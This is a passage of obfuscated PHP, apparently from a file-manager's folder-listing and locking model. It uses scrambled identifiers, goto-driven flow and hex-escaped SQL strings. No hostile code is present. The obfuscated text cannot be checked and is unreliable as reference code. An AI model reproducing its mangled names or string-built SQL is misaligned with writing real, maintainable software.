($bËÂ‚÷£ËÂ as &$cê¶¢ÚÀê) { $cê¶¢ÚÀê[$aºŒğŸ±¸[395]] = array($aºŒğŸ±¸[433] => 0, $aºŒğŸ±¸[434] => 0, $aºŒğŸ±¸[435] => 0); if (isset($e˜íÈï¹Ûƒ[$cê¶¢ÚÀê[$aºŒğŸ±¸[373]]])) { $cê¶¢ÚÀê[$aºŒğŸ±¸[395]][$aºŒğŸ±¸[436]] = 1; $cê¶¢ÚÀê[$aºŒğŸ±¸[395]][$aºŒğŸ±¸[437]] = $e˜íÈï¹Ûƒ[$cê¶¢ÚÀê[$aºŒğŸ±¸[373]]][$aºŒğŸ±¸[28]]; } if (isset($B›¶„âšç­[$cê¶¢ÚÀê[$aºŒğŸ±¸[373]]])) { $cê¶¢ÚÀê[$aºŒğŸ±¸[395]][$aºŒğŸ±¸[438]] = array(); foreach ($B›¶„âšç­[$cê¶¢ÚÀê[$aºŒğŸ±¸[373]]] as $fÕœ¯ÛÆé«) { $dğÂ••ëÎ· = $fèÌÕ‡Ú‘[$fÕœ¯ÛÆé«]; $cê¶¢ÚÀê[$aºŒğŸ±¸[395]][$aºŒğŸ±¸[438]][] = array($aºŒğŸ±¸[439] => $dğÂ••ëÎ·[$aºŒğŸ±¸[371]], $aºŒğŸ±¸[390] => $dğÂ••ëÎ·[$aºŒğŸ±¸[28]], $aºŒğŸ±¸[440] => $dğÂ••ëÎ·[$aºŒğŸ±¸[441]]); } } if (isset($bÜ·¹«Ş‚[$cê¶¢ÚÀê[$aºŒğŸ±¸[373]]])) { $cê¶¢ÚÀê[$aºŒğŸ±¸[395]][$aºŒğŸ±¸[442]] = array(); foreach ($bÜ·¹«Ş‚[$cê¶¢ÚÀê[$aºŒğŸ±¸[373]]] as $cÓ­‹Û…µê) { $cê¶¢ÚÀê[$aºŒğŸ±¸[395]][$aºŒğŸ±¸[442]] = array($aºŒğŸ±¸[443] => $cÓ­‹Û…µê[$aºŒğŸ±¸[444]], $aºŒğŸ±¸[445] => $cÓ­‹Û…µê[$aºŒğŸ±¸[446]], $aºŒğŸ±¸[447] => $cÓ­‹Û…µê[$aºŒğŸ±¸[373]], $aºŒğŸ±¸[448] => $cÓ­‹Û…µê[$aºŒğŸ±¸[449]], $aºŒğŸ±¸[450] => $cÓ­‹Û…µê[$aºŒğŸ±¸[451]], $aºŒğŸ±¸[452] => $cÓ­‹Û…µê[$aºŒğŸ±¸[452]], $aºŒğŸ±¸[453] => $cÓ­‹Û…µê[$aºŒğŸ±¸[453]]); } } } unset($cê¶¢ÚÀê); goto EİˆÙ·èƒ; EÈøÓÂÜ‰°: $fèÌÕ‡Ú‘ = array_to_keyvalue($BàÏÎ•šš¬, $aºŒğŸ±¸[371]); $B›¶„âšç­ = array_to_keyvalue_group($AÆ„¡áÄ¢Ğ, $aºŒğŸ±¸[75], $aºŒğŸ±¸[397]); $e˜íÈï¹Ûƒ = array_to_keyvalue($e›ŠÒ‘ŠÏŠ, $aºŒğŸ±¸[75]); goto cÏÉ¹æ†Î“; EİˆÙ·èƒ: return $bËÂ‚÷£ËÂ; goto F¨ÊæÓ°İ»; F¨ÊæÓ°İ»: } protected function _listAppendChildren(&$F»èõË«š, $Dİ˜‹Ï›àß) { goto fİóº‘òƒ”; fİóº‘òƒ”: $E¾Ì¼…Ä»ò =& $_SERVER[…Ò×–]; $fŞ«æ‡‚ÁÒ = $E¾Ì¼…Ä»ò[365]; $bî‹Ëªƒó = array(); goto AÛÜ¢‡; AÛÜ¢‡: $AÍÎó§ˆÕ = 1024 * 50; $F»èõË«š = is_array($F»èõË«š) ? $F»èõË«š : array(); $fÒğòê‰íß = count($F»èõË«š); goto D¶¶ì¡âë; D¶¶ì¡âë: $Bù·¾µµ“Á = $this->tablePrefix . $this->tableName; for ($eğù”à“Í  = 0; $eğù”à“Í  < $fÒğòê‰íß; $eğù”à“Í ++) { $F¡Ş³Üâ×© = intval($F»èõË«š[$eğù”à“Í ][$E¾Ì¼…Ä»ò[401]]); if ($F»èõË«š[$eğù”à“Í ][$E¾Ì¼…Ä»ò[374]]) { $Fª”½Áª×‡ = $F»èõË«š[$eğù”à“Í ][$E¾Ì¼…Ä»ò[373]]; $fŞ«æ‡‚ÁÒ .= "\123\105\114\x45\103\x54\x20\x2a\40\x46\122\117\x4d\x20\x28\123\105\x4c\x45\x43\124\40\47{$Fª”½Áª×‡}\137\x68\x61\163\106\x69\x6c\145\47\40\x61\x73\40\x68\x61\163\x2c\x63\x6f\165\x6e\164\50\x31\51\x20\141\163\x20\x68\141\163\x43\157\x75\156\x74\40\106\122\x4f\115\40\x60{$Bù·¾µµ“Á}\x60\40\12\x9\11\x9\11\x9\x77\x68\x65\x72\145\40\x70\x61\x72\x65\x6e\164\111\104\75{$Fª”½Áª×‡}\x20\141\x6e\144\40\x69\163\x46\x6f\154\x64\x65\x72\x3d\60\40\x61\x6e\144\x20\x69\163\x44\145\154\x65\x74\145\75{$F¡Ş³Üâ×©}\51\x20\141\x73\x20\x74\142\61\137{$Fª”½Áª×‡}\x20\x75\x6e\x69\157\x6e\x20\x61\154\154\40\xa\11\x9\x9\11\x9\x53\x45\114\x45\103\124\40\52\x20\106\122\117\x4d\x20\50\x53\105\x4c\105\x43\x54\x20\x27{$Fª”½Áª×‡}\137\150\x61\x73\x46\157\154\144\x65\x72\x27\x20\141\x73\x20\150\141\x73\x46\x69\154\x65\x2c\143\x6f\165\x6e\164\x28\x31\x29\40\141\163\x20\150\141\x73\x43\x6f\165\x6e\x74\40\106\x52\x4f\115\40\140{$Bù·¾µµ“Á}\140\x20\xa\11\x9\11\11\x9\x77\150\x65\162\145\40\x70\x61\162\145\x6e\x74\111\x44\75{$Fª”½Áª×‡}\x20\x61\x6e\x64\40\151\x73\106\x6f\x6c\x64\x65\162\x3d\61\40\141\156\x64\40\151\x73\x44\145\x6c\145\x74\145\75{$F¡Ş³Üâ×©}\51\40\141\x73\40\164\x62\62\137{$Fª”½Áª×‡}\40\x75\x6e\151\x6f\156\40\141\x6c\154\40"; } if ((strlen($fŞ«æ‡‚ÁÒ) >= $AÍÎó§ˆÕ || $eğù”à“Í  == $fÒğòê‰íß - 1) && $fŞ«æ‡‚ÁÒ) { $fŞ«æ‡‚ÁÒ = substr($fŞ«æ‡‚ÁÒ, 0, -strlen($E¾Ì¼…Ä»ò[454])); $FÆ™×ÌÈ•– = $this->query($fŞ«æ‡‚ÁÒ); $bî‹Ëªƒó = array_merge($bî‹Ëªƒó, $FÆ™×ÌÈ•–); $fŞ«æ‡‚ÁÒ = $E¾Ì¼…Ä»ò[33]; } } $bî‹Ëªƒó = array_to_keyvalue($bî‹Ëªƒó, $E¾Ì¼…Ä»ò[455]); goto C¦›ï±¹‰º; C¦›ï±¹‰º: foreach ($F»èõË«š as &$AµÓºéæ÷¸) { if ($AµÓºéæ÷¸[$E¾Ì¼…Ä»ò[374]]) { unset($AµÓºéæ÷¸[$E¾Ì¼…Ä»ò[376]]); $AµÓºéæ÷¸[$E¾Ì¼…Ä»ò[196]] = intval($bî‹Ëªƒó[$AµÓºéæ÷¸[$E¾Ì¼…Ä»ò[373]] . $E¾Ì¼…Ä»ò[456]][$E¾Ì¼…Ä»ò[457]]); $AµÓºéæ÷¸[$E¾Ì¼…Ä»ò[195]] = intval($bî‹Ëªƒó[$AµÓºéæ÷¸[$E¾Ì¼…Ä»ò[373]] . $E¾Ì¼…Ä»ò[458]][$E¾Ì¼…Ä»ò[457]]); } } unset($AµÓºéæ÷¸); goto f¿Ë»©¹‹ ; f¿Ë»©¹‹ : } protected function _listAppendAuth(&$dË£õ½ïœ) { goto båæùê¹õº; BÑéô’¡¬: foreach ($dË£õ½ïœ as $AµÖíãğõÀ) { if ($AµÖíãğõÀ[$côÛ³Ï‡÷â[375]] == self::TYPE_GROUP) { $c„¤‚­›æ©[] = $AµÖíãğõÀ[$côÛ³Ï‡÷â[373]]; } } if (!$c„¤‚­›æ©) { return; } $D¥Ì²‹½÷ = array_to_keyvalue($dË£õ½ïœ, $côÛ³Ï‡÷â[373]); goto dùº­†éæ; båæùê¹õº: $côÛ³Ï‡÷â =& $_SERVER[…Ò×–]; if (!defined($côÛ³Ï‡÷â[430])) { return; } $c„¤‚­›æ© = array(); goto BÑéô’¡¬; dùº­†éæ: $F™îö¯ƒ = Model($côÛ³Ï‡÷â[459])->getSourceList($c„¤‚­›æ©, $D¥Ì²‹½÷); foreach ($dË£õ½ïœ as $EÃµ½„»’ => &$AµÖíãğõÀ) { $AµÖíãğõÀ[$côÛ³Ï‡÷â[380]] = $F™îö¯ƒ[$AµÖíãğõÀ[$côÛ³Ï‡÷â[373]]]; if (!$AµÖíãğõÀ[$côÛ³Ï‡÷â[380]] && $AµÖíãğõÀ[$côÛ³Ï‡÷â[375]] == self::TYPE_GROUP) { $AµÖíãğõÀ[$côÛ³Ï‡÷â[380]] = Action($côÛ³Ï‡÷â[460])->pathGroupAuthMake($AµÖíãğõÀ[$côÛ³Ï‡÷â[461]]); if (!$AµÖíãğõÀ[$côÛ³Ï‡÷â[380]] && !_get($GLOBALS, $côÛ³Ï‡÷â[462])) { $AµÖíãğõÀ[$côÛ³Ï‡÷â[193]] = !1; $AµÖíãğõÀ[$côÛ³Ï‡÷â[192]] = !1; } } if ($AµÖíãğõÀ[$côÛ³Ï‡÷â[380]]) { $AµÖíãğõÀ[$côÛ³Ï‡÷â[193]] = AuthModel::authCheckEdit($AµÖíãğõÀ[$côÛ³Ï‡÷â[380]][$côÛ³Ï‡÷â[381]]); $AµÖíãğõÀ[$côÛ³Ï‡÷â[192]] = AuthModel::authCheckView($AµÖíãğõÀ[$côÛ³Ï‡÷â[380]][$côÛ³Ï‡÷â[381]]); } $this->groupPathDisplay($AµÖíãğõÀ); } unset($AµÖíãğõÀ); goto aò«ÎˆÏƒ†; aò«ÎˆÏƒ†: } public function groupPathDisplay(&$eéå›¯‘ò‰) { goto fá­³–†Å; eè¸Ò¾´Ê±: $bî÷­Şùµ“ = $this->parentLevelArray($B‰¡¬ìëÚß[$eŞóË¦ÊÆƒ[464]]); $Eï£¦îØğ = $eŞóË¦ÊÆƒ[33]; foreach ($bî÷­Şùµ“ as $c‰¦×Â–Ã‹) { $aß¶ôÀ‡àî = Model($eŞóË¦ÊÆƒ[463])->getInfo($c‰¦×Â–Ã‹); $Eï£¦îØğ .= $aß¶ôÀ‡àî[$eŞóË¦ÊÆƒ[395]][$eŞóË¦ÊÆƒ[373]] . $eŞóË¦ÊÆƒ[47]; } goto bøÕôŒÏÄŒ; bøÕôŒÏÄŒ: $eéå›¯‘ò‰[$eŞóË¦ÊÆƒ[465]] = $B‰¡¬ìëÚß[$eŞóË¦ÊÆƒ[466]]; $eéå›¯‘ò‰[$eŞóË¦ÊÆƒ[384]] = $B‰¡¬ìëÚß[$eŞóË¦ÊÆƒ[464]]; $eéå›¯‘ò‰[$eŞóË¦ÊÆƒ[467]] = $B‰¡¬ìëÚß[$eŞóË¦ÊÆƒ[468]]; goto FÓÙé¯åë; fá­³–†Å: $eŞóË¦ÊÆƒ =& $_SERVER[…Ò×–]; if ($eéå›¯‘ò‰[$eŞóË¦ÊÆƒ[375]] != self::TYPE_GROUP) { return; } $B‰¡¬ìëÚß = Model($eŞóË¦ÊÆƒ[463])->getInfo($eéå›¯‘ò‰[$eŞóË¦ÊÆƒ[461]]); goto eè¸Ò¾´Ê±; FÓÙé¯åë: $eéå›¯‘ò‰[$eŞóË¦ÊÆƒ[469]] = $Eï£¦îØğ . $B‰¡¬ìëÚß[$eŞóË¦ÊÆƒ[395]][$eŞóË¦ÊÆƒ[373]]; goto CÊ‰ˆÃŠ´É; CÊ‰ˆÃŠ´É: } protected function _listAppendPath(&$c”÷š­†¦) { goto D±¬ë É‰œ; A¦ëŸÄ†á¢: $D‘Ï«Æ×İÍ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($c”÷š­†¦ as &$dœªÉğÖ–) { goto bİ±×Ã¥¼½; bİ±×Ã¥¼½: $bäåáíŞÈù = $this->parentLevelArray($dœªÉğÖ–[$dÁÂ¸æœ‡¼[464]]); $A¦›™²ƒº = $this->_listAppendPathRoot($dœªÉğÖ–, $bäåáíŞÈù); foreach ($bäåáíŞÈù as $c»ßÈÎœõå => $d›˜£í²Ÿ¢) { if ($c»ßÈÎœõå == 0 && $A¦›™²ƒº && $dœªÉğÖ–[$dÁÂ¸æœ‡¼[375]] == self::TYPE_GROUP) { continue; } if (isset($b¦¢æªš„Å[$d›˜£í²Ÿ¢])) { $A¦›™²ƒº .= $b¦¢æªš„Å[$d›˜£í²Ÿ¢] . $dÁÂ¸æœ‡¼[8]; } } goto cò”©î´•¹; D‰ùÆÇË£†: $Eá²´ÒÜ = trim($dœªÉğÖ–[$dÁÂ¸æœ‡¼[471]], $dÁÂ¸æœ‡¼[8]); if ($dœªÉğÖ–[$dÁÂ¸æœ‡¼[466]] == $dÁÂ¸æœ‡¼[473] && $Eá²´ÒÜ) { $dœªÉğÖ–[$dÁÂ¸æœ‡¼[28]] = $Eá²´ÒÜ; } $this->_listAppendPathRecycle($dœªÉğÖ–, $bäåáíŞÈù, $D‘Ï«Æ×İÍ); goto B‰™¸ªŸ‚ò; cò”©î´•¹: if ($bäåáíŞÈù) { $A¦›™²ƒº .= $dœªÉğÖ–[$dÁÂ¸æœ‡¼[28]]; } if ($dœªÉğÖ–[$dÁÂ¸æœ‡¼[374]]) { $A¦›™²ƒº .= $dÁÂ¸æœ‡¼[8]; } $dœªÉğÖ–[$dÁÂ¸æœ‡¼[471]] = str_replace($dÁÂ¸æœ‡¼[472], $dÁÂ¸æœ‡¼[8], $A¦›™²ƒº); goto D‰ùÆÇË£†; B‰™¸ªŸ‚ò: } unset($dœªÉğÖ–); goto a…áº™ùîÖ; a…áº™ùîÖ: return $c”÷š­†¦; goto cÅ¦ù¾•Çù; D±¬ë É‰œ: $dÁÂ¸æœ‡¼ =& $_SERVER[…Ò×–]; static $b¦¢æªš„Å = array(); $cŠµëÇÅ‘ƒ = array(); goto Fôåö„°š‘; Fôåö„°š‘: foreach ($c”÷š­†¦ as &$dœªÉğÖ–) { $b¦¢æªš„Å[$dœªÉğÖ–[$dÁÂ¸æœ‡¼[373]]] = $dœªÉğÖ–[$dÁÂ¸æœ‡¼[28]]; $bäåáíŞÈù = $this->parentLevelArray($dœªÉğÖ–[$dÁÂ¸æœ‡¼[464]]); foreach ($bäåáíŞÈù as $c»ßÈÎœõå => $d›˜£í²Ÿ¢) { if ($c»ßÈÎœõå != 0 && !isset($b¦¢æªš„Å[$d›˜£í²Ÿ¢])) { $cŠµëÇÅ‘ƒ[] = $d›˜£í²Ÿ¢; } } } unset($dœªÉğÖ–); if (count($cŠµëÇÅ‘ƒ) > 0) { $b»ÇÉ™ËĞÈ = array($dÁÂ¸æœ‡¼[387] => array($dÁÂ¸æœ‡¼[388], $cŠµëÇÅ‘ƒ)); if (count($cŠµëÇÅ‘ƒ) == 1) { $e±˜Œ›’è = $this->sourceInfo($cŠµëÇÅ‘ƒ[0]); $eİÖİµ‡ = is_array($e±˜Œ›’è) ? array($e±˜Œ›’è) : !1; } else { $eİÖİµ‡ = $this->field($dÁÂ¸æœ‡¼[470])->where($b»ÇÉ™ËĞÈ)->select(); } $EĞ®—‘‰ï» = array_to_keyvalue($eİÖİµ‡, $dÁÂ¸æœ‡¼[373], $dÁÂ¸æœ‡¼[28]); $b¦¢æªš„Å = array_merge_index($b¦¢æªš„Å, $EĞ®—‘‰ï»); } goto A¦ëŸÄ†á¢; cÅ¦ù¾•Çù: } private function _listAppendPathRecycle(&$aŒèëÇœ•ó, $aÊ²Œ¸Ê, $aÜ¢òÉíÜÚ) { goto bí›Çïœ; C©ƒ˜éĞÀ: $aŒèëÇœ•ó[$a»ÈÄ•ƒÛ‰[464]] = $a»ÈÄ•ƒÛ‰[475] . implode($a»ÈÄ•ƒÛ‰[47], array_slice($aÊ²Œ¸Ê, 1)) . $a»ÈÄ•ƒÛ‰[47]; if ($aŒèëÇœ•ó[$a»ÈÄ•ƒÛ‰[373]] == $aÜ¢òÉíÜÚ) { $aŒèëÇœ•ó[$a»ÈÄ•ƒÛ‰[464]] = $a»ÈÄ•ƒÛ‰[475]; $aŒèëÇœ•ó[$a»ÈÄ•ƒÛ‰[466]] = $a»ÈÄ•ƒÛ‰[473]; $aŒèëÇœ•ó[$a»ÈÄ•ƒÛ‰[28]] = LNG($a»ÈÄ•ƒÛ‰[474]); } $aŒèëÇœ•ó[$a»ÈÄ•ƒÛ‰[476]] = $a»ÈÄ•ƒÛ‰[477]; goto cİ¡æÔ§; bí›Çïœ: $a»ÈÄ•ƒÛ‰ =& $_SERVER[…Ò×–]; if (intval($aŒèëÇœ•ó[$a»ÈÄ•ƒÛ‰[375]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($aÜ¢òÉíÜÚ, $aÊ²Œ¸Ê) && $aŒèëÇœ•ó[$a»ÈÄ•ƒÛ‰[373]] != $aÜ¢òÉíÜÚ) { return; } goto dï‹„“Ÿµ; dï‹„“Ÿµ: $C·øÅ¹äÇ = explode($a»ÈÄ•ƒÛ‰[8], trim($aŒèëÇœ•ó[$a»ÈÄ•ƒÛ‰[471]], $a»ÈÄ•ƒÛ‰[8])); $aóæ…¯¡òœ = implode($a»ÈÄ•ƒÛ‰[8], array_slice($C·øÅ¹äÇ, 2)); $aŒèëÇœ•ó[$a»ÈÄ•ƒÛ‰[471]] = $a»ÈÄ•ƒÛ‰[8] . LNG($a»ÈÄ•ƒÛ‰[474]) . $a»ÈÄ•ƒÛ‰[8] . ltrim($aóæ…¯¡òœ, $a»ÈÄ•ƒÛ‰[8]); goto C©ƒ˜éĞÀ; cİ¡æÔ§: } protected function _listAppendPathRoot(&$BèÚ¨î™°à, $cùùÎºÅ©Ã) { $AßÖ”‹İçª =& $_SERVER[…Ò×–]; $f¬ğÙœ·Ù  = $AßÖ”‹İçª[33]; if ($BèÚ¨î™°à[$AßÖ”‹İçª[375]] == self::TYPE_USER) { if (defined($AßÖ”‹İçª[430]) && $BèÚ¨î™°à[$AßÖ”‹İçª[461]] == USER_ID) { $f¬ğÙœ·Ù  = LNG($AßÖ”‹İçª[478]); if (!$cùùÎºÅ©Ã) { $BèÚ¨î™°à[$AßÖ”‹İçª[28]] = $f¬ğÙœ·Ù ; } } else { $cÑŞÚ‡ğœ = Model($AßÖ”‹İçª[479])->getInfoSimple($BèÚ¨î™°à[$AßÖ”‹İçª[461]]); $f¬ğÙœ·Ù  = LNG($AßÖ”‹İçª[480]) . $AßÖ”‹İçª[157] . $cÑŞÚ‡ğœ[$AßÖ”‹İçª[28]] . $AßÖ”‹İçª[481]; } } else { if ($BèÚ¨î™°à[$AßÖ”‹İçª[375]] == self::TYPE_GROUP) { $cÑŞÚ‡ğœ = Model($AßÖ”‹İçª[463])->getInfoSimple($BèÚ¨î™°à[$AßÖ”‹İçª[461]]); $f¬ğÙœ·Ù  = $cÑŞÚ‡ğœ[$AßÖ”‹İçª[28]]; } else { if ($BèÚ¨î™°à[$AßÖ”‹İçª[375]] == self::TYPE_SYSTEM) { $cÑŞÚ‡ğœ = $this->sourceInfo($cùùÎºÅ©Ã[0], !0); $f¬ğÙœ·Ù  = $cÑŞÚ‡ğœ[$AßÖ”‹İçª[28]]; } } } $f¬ğÙœ·Ù  = $f¬ğÙœ·Ù  ? $AßÖ”‹İçª[8] . $f¬ğÙœ·Ù  . $AßÖ”‹İçª[8] : $AßÖ”‹İçª[8]; return $f¬ğÙœ·Ù ; } protected function _listAppendUser(&$BÙî¥Ââ‰‰) { goto F×ºïÄöÍ‡; e¿·×¢êª¨: unset($eš‚ÇŠ»Ô•); goto DÌ±“äŸ½; C©íĞ¸ÒÔƒ: $E £×ß§©ƒ = array_merge($Aß¼¾Â¯Ö, $dÜ¯‡ã…°Ğ); $A¯ê Š¯Û¦ = Model($bƒçááØ³Ì[482])->userListInfo($E £×ß§©ƒ); foreach ($BÙî¥Ââ‰‰ as &$eš‚ÇŠ»Ô•) { $AßÜ—¬…ğ˜ = $eš‚ÇŠ»Ô•[$bƒçááØ³Ì[382]]; $eš‚ÇŠ»Ô•[$bƒçááØ³Ì[382]] = $A¯ê Š¯Û¦[$AßÜ—¬…ğ˜] ? $A¯ê Š¯Û¦[$AßÜ—¬…ğ˜] : !1; $AßÜ—¬…ğ˜ = $eš‚ÇŠ»Ô•[$bƒçááØ³Ì[383]]; $eš‚ÇŠ»Ô•[$bƒçááØ³Ì[383]] = $A¯ê Š¯Û¦[$AßÜ—¬…ğ˜] ? $A¯ê Š¯Û¦[$AßÜ—¬…ğ˜] : !1; if (isset($eš‚ÇŠ»Ô•[$bƒçááØ³Ì[421]]) && $eš‚ÇŠ»Ô•[$bƒçááØ³Ì[421]][$bƒçááØ³Ì[483]]) { $E²²¬“¼áõ = $GLOBALS[$bƒçááØ³Ì[6]][$bƒçááØ³Ì[84]][$bƒçááØ³Ì[484]]; if ($eš‚ÇŠ»Ô•[$bƒçááØ³Ì[421]][$bƒçááØ³Ì[485]] <= time() - $E²²¬“¼áõ) { $this->metaSet($eš‚ÇŠ»Ô•[$bƒçááØ³Ì[373]], $bƒçááØ³Ì[483], null); $this->metaSet($eš‚ÇŠ»Ô•[$bƒçááØ³Ì[373]], $bƒçááØ³Ì[485], null); unset($eš‚ÇŠ»Ô•[$bƒçááØ³Ì[421]][$bƒçááØ³Ì[483]]); continue; } $DÔˆê·ÒÎ˜ = $eš‚ÇŠ»Ô•[$bƒçááØ³Ì[421]][$bƒçááØ³Ì[483]]; $eš‚ÇŠ»Ô•[$bƒçááØ³Ì[421]][$bƒçááØ³Ì[486]] = Model($bƒçááØ³Ì[482])->getInfoSimpleOuter($DÔˆê·ÒÎ˜); } } goto e¿·×¢êª¨; F×ºïÄöÍ‡: $bƒçááØ³Ì =& $_SERVER[…Ò×–]; $Aß¼¾Â¯Ö = array_to_keyvalue($BÙî¥Ââ‰‰, $bƒçááØ³Ì[33], $bƒçááØ³Ì[382]); $dÜ¯‡ã…°Ğ = array_to_keyvalue($BÙî¥Ââ‰‰, $bƒçááØ³Ì[33], $bƒçááØ³Ì[383]); goto C©íĞ¸ÒÔƒ; DÌ±“äŸ½: } public function parentLevelArray($cøãñòÑ©•) { $Cì¶²´Ö§ =& $_SERVER[…Ò×–]; $cøãñòÑ©• = explode($Cì¶²´Ö§[47], trim($cøãñòÑ©•, $Cì¶²´Ö§[47])); return array_remove_value($cøãñòÑ©•, $Cì¶²´Ö§[473]); } public function listAll($bõÛÖ•ßñ¤) { goto EŠ“áä‡ƒ; føçÛßäÀ©: $this->_listAppendAuth($DÊÃ°©†´¡); $this->_listAppendUser($DÊÃ°©†´¡); $this->_listAppendPath($DÊÃ°©†´¡); goto d¼Ç›çóùç; d°ãğÏõßõ: $bæ©È®©ê = $AÓóÍ‘…¸[491]; $d®©Óìµ¯ = "\x4c\105\x46\124\40\112\x4f\111\116\40{$this->tablePrefix}\x69\x6f\137\146\151\x6c\x65\x20\x66\x69\154\145\x20\x6f\x6e\x20\x73\157\x75\x72\x63\145\x2e\x66\151\154\x65\111\104\x20\75\x20\146\151\x6c\x65\x2e\146\151\154\145\111\x44"; $DÊÃ°©†´¡ = $this->alias($AÓóÍ‘…¸[492])->field($bæ©È®©ê)->where($BçÇ§ì¡š)->join($d®©Óìµ¯)->select(); goto føçÛßäÀ©; EŠ“áä‡ƒ: $AÓóÍ‘…¸ =& $_SERVER[…Ò×–]; $e†ëº°† = $this->sourceInfo($bõÛÖ•ßñ¤); $BçÇ§ì¡š = array($AÓóÍ‘…¸[487] => array($AÓóÍ‘…¸[488], $e†ëº°†[$AÓóÍ‘…¸[464]] . $bõÛÖ•ßñ¤ . $AÓóÍ‘…¸[489]), $AÓóÍ‘…¸[490] => 0); goto d°ãğÏõßõ; e³‹¹Ú‰Ó¸: $a¼­¤Ùâ´ = array(); foreach ($DÊÃ°©†´¡ as $D©Ÿ»Š‘¿­ => $BÖ¢ÀùğŒ) { goto bî”é¸Å‰•; bî”é¸Å‰•: $fÄÄ§¤‚‘ô = $this->parentLevelArray($BÖ¢ÀùğŒ[$AÓóÍ‘…¸[464]]); array_shift($fÄÄ§¤‚‘ô); $F½ß¡ÑöÌæ = $f“¸äÎ§®Â; goto cÑˆ»Çé³ø; B‹§¡íÙ‰ä: $F½ß¡ÑöÌæ = str_replace($AÓóÍ‘…¸[472], $AÓóÍ‘…¸[8], $F½ß¡ÑöÌæ); $F½ß¡ÑöÌæ = str_replace($AÓóÍ‘…¸[472], $AÓóÍ‘…¸[8], $F½ß¡ÑöÌæ); $fÔ‡ƒôÚó = array($AÓóÍ‘…¸[391] => str_replace($AÓóÍ‘…¸[472], $AÓóÍ‘…¸[8], $F½ß¡ÑöÌæ), $AÓóÍ‘…¸[493] => intval($BÖ¢ÀùğŒ[$AÓóÍ‘…¸[374]]), $AÓóÍ‘…¸[395] => $this->pathInfoFilter($BÖ¢ÀùğŒ, !0)); goto C²Ò¾–—‘; cÑˆ»Çé³ø: for ($Aß¶ÕÕÇç = 0; $Aß¶ÕÕÇç < count($fÄÄ§¤‚‘ô); $Aß¶ÕÕÇç++) { $F½ß¡ÑöÌæ .= $DÊÃ°©†´¡[$fÄÄ§¤‚‘ô[$Aß¶ÕÕÇç]][$AÓóÍ‘…¸[28]] . $AÓóÍ‘…¸[8]; } $F½ß¡ÑöÌæ .= $BÖ¢ÀùğŒ[$AÓóÍ‘…¸[28]]; if ($BÖ¢ÀùğŒ[$AÓóÍ‘…¸[374]]) { $F½ß¡ÑöÌæ .= $AÓóÍ‘…¸[8]; } goto B‹§¡íÙ‰ä; C²Ò¾–—‘: if (!$BÖ¢ÀùğŒ[$AÓóÍ‘…¸[374]]) { $fÔ‡ƒôÚó[$AÓóÍ‘…¸[423]] = $BÖ¢ÀùğŒ[$AÓóÍ‘…¸[423]]; $fÔ‡ƒôÚó[$AÓóÍ‘…¸[494]] = $BÖ¢ÀùğŒ[$AÓóÍ‘…¸[75]]; } $a¼­¤Ùâ´[] = $fÔ‡ƒôÚó; goto BºÂ³‡¾Üñ; BºÂ³‡¾Üñ: } return $a¼­¤Ùâ´; goto bÇï‘´¡¨Ä; d¼Ç›çóùç: $DÊÃ°©†´¡ = array_to_keyvalue($DÊÃ°©†´¡, $AÓóÍ‘…¸[373]); $f“¸äÎ§®Â = "\57{$e†ëº°†[$AÓóÍ‘…¸[28]]}\x2f"; $f“¸äÎ§®Â = $f“¸äÎ§®Â == $AÓóÍ‘…¸[472] ? $AÓóÍ‘…¸[8] : $f“¸äÎ§®Â; goto e³‹¹Ú‰Ó¸; bÇï‘´¡¨Ä: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($d­ôÕ—º÷) { goto Fßœ½ÒŞè¹; Cê±ºá‚Û„: $this->_lockEvent($d­ôÕ—º÷, array($FÌî“‰öï–[498], $FÌî“‰öï–[499]), $FĞÅŠÛÙá¬); $this->_lockCheckEnd($FÌî“‰öï–[495], $d­ôÕ—º÷); goto C˜£ó°¨Ì®; Fßœ½ÒŞè¹: $FÌî“‰öï– =& $_SERVER[…Ò×–]; if (!$this->allowLock()) { return; } $this->_lockCheck($FÌî“‰öï–[495], $d­ôÕ—º÷); goto BáŸ«ø‘˜; BáŸ«ø‘˜: $FĞÅŠÛÙá¬ = 1; $this->_lockEvent($d­ôÕ—º÷, array($FÌî“‰öï–[496], $FÌî“‰öï–[497]), $FĞÅŠÛÙá¬); $this->_lockParent($d­ôÕ—º÷, array($FÌî“‰öï–[497]), $FĞÅŠÛÙá¬); goto Cê±ºá‚Û„; C˜£ó°¨Ì®: } public function lockCopyEnd($B£ÌÕš˜Úà) { $d¢Š»­–ã‡ =& $_SERVER[…Ò×–]; if (!$this->allowLock()) { return; } $D«î ­©ŞÆ = 0; $this->_lockEvent($B£ÌÕš˜Úà, array($d¢Š»­–ã‡[496], $d¢Š»­–ã‡[497]), $D«î ­©ŞÆ); $this->_lockParent($B£ÌÕš˜Úà, array($d¢Š»­–ã‡[497]), $D«î ­©ŞÆ); $this->_lockEvent($B£ÌÕš˜Úà, array($d¢Š»­–ã‡[498], $d¢Š»­–ã‡[499]), $D«î ­©ŞÆ); } public function lockWriteStart($B‘Œâ½—Ù, $E¯êæ¤à = '') { goto B‹¥¹Óˆ‰­; EäËšó‘Ä¼: $this->_lockParent($B‘Œâ½—Ù, array($BŸç‰ß÷œ‚[495], $BŸç‰ß÷œ‚[497]), $Bî¶±†Ó¨„); $this->_lockCheckEnd($BŸç‰ß÷œ‚[496], $B‘Œâ½—Ù); goto aÏãÙ‘«¡¬; B‹¥¹Óˆ‰­: $BŸç‰ß÷œ‚ =& $_SERVER[…Ò×–]; if (!$this->allowLock()) { return; } $this->_lockCheck($BŸç‰ß÷œ‚[496], $B‘Œâ½—Ù); goto bì˜˜¦‡; bì˜˜¦‡: $Bî¶±†Ó¨„ = 1; $this->_lockKey($BŸç‰ß÷œ‚[500] . $B‘Œâ½—Ù . $BŸç‰ß÷œ‚[91] . $E¯êæ¤à, $Bî¶±†Ó¨„); $this->_lockEvent($B‘Œâ½—Ù, array($BŸç‰ß÷œ‚[495], $BŸç‰ß÷œ‚[497]), $Bî¶±†Ó¨„); goto EäËšó‘Ä¼; aÏãÙ‘«¡¬: } public function lockWriteEnd($FÅ“®›‡Ù, $A‘Úáº–òß = '') { $eËØÅÕÑÚ§ =& $_SERVER[…Ò×–]; if (!$this->allowLock()) { return; } $c÷¨Ó— ¬ = 0; $this->_lockKey($eËØÅÕÑÚ§[500] . $FÅ“®›‡Ù . $eËØÅÕÑÚ§[91] . $A‘Úáº–òß, 